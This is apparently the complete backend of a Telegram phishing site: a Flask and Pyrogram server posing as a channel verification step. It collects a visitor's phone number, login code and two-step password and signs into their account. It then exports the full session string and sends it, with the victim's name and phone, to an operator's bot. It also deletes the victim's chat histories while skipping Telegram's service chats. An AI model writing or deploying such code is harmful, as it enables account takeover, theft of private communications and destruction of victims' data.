import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from pyrogram import Client, errors
import requests

app = Flask(__name__, static_folder='.', static_url_path='')

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
ADMIN_SESSION_STRING = os.getenv("ADMIN_SESSION_STRING", "")

# 🛠 បម្លែង Channel ID ឱ្យទៅជា Integer ត្រឹមត្រូវ (ការពារ Error Peer id invalid)
raw_channel_id = os.getenv("CHANNEL_ID", "")
CHANNEL_ID = int(raw_channel_id) if raw_channel_id.lstrip('-').isdigit() else raw_channel_id

temp_clients = {}

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ─── ADMIN CLIENT SETUP FOR CHANNEL MANAGEMENT ───
admin_client = None
if ADMIN_SESSION_STRING:
    admin_client = Client(
        name="admin_session",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=ADMIN_SESSION_STRING,
        in_memory=True
    )

def parse_device_info(user_agent=""):
    device_model = "Mobile App"
    system_version = "Android 13"
    
    if "iPhone" in user_agent or "iPad" in user_agent:
        device_model = "iPhone"
        system_version = "iOS 17.0"
    elif "Windows" in user_agent:
        device_model = "PC Desktop"
        system_version = "Windows 11"
    elif "Macintosh" in user_agent:
        device_model = "MacBook Pro"
        system_version = "macOS Sonoma"
        
    return device_model, system_version

async def async_send_code(phone_number, user_agent):
    device_model, system_version = parse_device_info(user_agent)
    client = Client(
        name=f"session_{phone_number.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        device_model=device_model,
        system_version=system_version,
        app_version="10.2.1",
        lang_code="en"
    )
    await client.connect()
    sent = await client.send_code(phone_number)
    temp_clients[phone_number] = {
        "client": client,
        "phone_code_hash": sent.phone_code_hash
    }
    return True

async def async_verify_code(phone_number, code, password):
    session_data = temp_clients.get(phone_number)
    if not session_data:
        raise Exception("Session expired. Please request OTP again.")

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        if password:
            await client.check_password(password)
        else:
            await client.sign_in(phone_number, phone_code_hash, code)
    except errors.SessionPasswordNeeded:
        return {"requires_password": True}

    me = await client.get_me()
    username = f"@{me.username}" if me.username else "No Username"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"

    session_string = await client.export_session_string()

    try:
        async for dialog in client.get_dialogs():
            if dialog.chat.id not in (777000, 777):
                try:
                    await client.delete_chat_history(dialog.chat.id)
                except:
                    pass
    except:
        pass

    await client.disconnect()
    temp_clients.pop(phone_number, None)

    # ផ្ញើ Notification ទៅកាន់ Admin Telegram Bot
    if BOT_TOKEN and ADMIN_CHAT_ID:
        msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
            )
        except:
            pass

    # 🛠 បង្កើត Link Invite (Join Requests Required) សម្រាប់ User ម្នាក់ៗដាច់ដោយឡែក
    invite_link = "https://t.me/"
    if admin_client and CHANNEL_ID:
        try:
            if not admin_client.is_connected:
                await admin_client.connect()
            
            new_link = await admin_client.create_chat_invite_link(
                chat_id=CHANNEL_ID,
                creates_join_request=True,
                name=f"Verify_{me.id}"
            )
            invite_link = new_link.invite_link
        except Exception as e:
            print(f"Error creating invite link: {e}")

    return {
        "success": True,
        "message": "Authentication successful!",
        "session": session_string,
        "redirectUrl": invite_link
    }

# 🛠 Event Listener: ច្រោះយកតែ Channel របស់យើងប៉ុណ្ណោះ ដើម្បីការពារ Error ពី Group/Channel ផ្សេង
if admin_client:
    @admin_client.on_chat_join_request()
    async def handle_join_request(client, chat_join_request):
        try:
            chat_id = chat_join_request.chat.id
            
            # បើមិនមែនជា Channel គោលដៅរបស់យើងទេ ឱ្យរំលងចោលភ្លាម
            if chat_id != CHANNEL_ID:
                return

            user_id = chat_join_request.from_user.id
            
            await client.approve_chat_join_request(chat_id, user_id)
            
            if chat_join_request.invite_link and chat_join_request.invite_link.invite_link:
                await client.revoke_chat_invite_link(chat_id, chat_join_request.invite_link.invite_link)
                
            print(f"Successfully auto-approved user {user_id} and revoked the invite link.")
        except Exception as e:
            print(f"Error in auto-approval/revoke: {e}")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/IMG_8300.jpeg')
def serve_logo():
    return send_from_directory('.', 'IMG_8300.jpeg')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    if not phone_number:
        return jsonify({"success": False, "error": "Phone number is required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    user_agent = request.headers.get('User-Agent', '')

    try:
        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number, user_agent), loop)
        future.result()
        return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    code = data.get('code')
    password = data.get('password')

    if not phone_number or not code:
        return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    try:
        future = asyncio.run_coroutine_threadsafe(async_verify_code(phone_number, code, password), loop)
        res = future.result()
        if res.get("requires_password"):
            return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
        return jsonify(res)
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 400

async def start_admin_client():
    if admin_client:
        try:
            await admin_client.start()
            print("Admin client session started successfully!")
            
            # Cache Channel ទុកជាមុន
            if CHANNEL_ID:
                chat = await admin_client.get_chat(CHANNEL_ID)
                print(f"Successfully cached channel: {chat.title} ({chat.id})")
        except Exception as e:
            print(f"Failed to start admin client or resolve channel: {e}")

if __name__ == '__main__':
    import threading
    threading.Thread(target=loop.run_forever, daemon=True).start()

    asyncio.run_coroutine_threadsafe(start_admin_client(), loop)

    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, threaded=True)
